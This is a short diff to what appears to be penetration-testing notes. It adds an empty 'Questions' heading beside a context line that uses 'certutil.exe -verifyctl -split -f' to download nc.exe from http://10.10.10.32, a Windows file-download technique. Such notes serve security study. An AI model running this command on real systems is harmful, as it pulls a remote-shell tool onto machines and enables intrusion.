@@ -70,3 +70,5 @@ Can be used to download files on Windows machines.
 certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
 ```
 
+### Questions
+
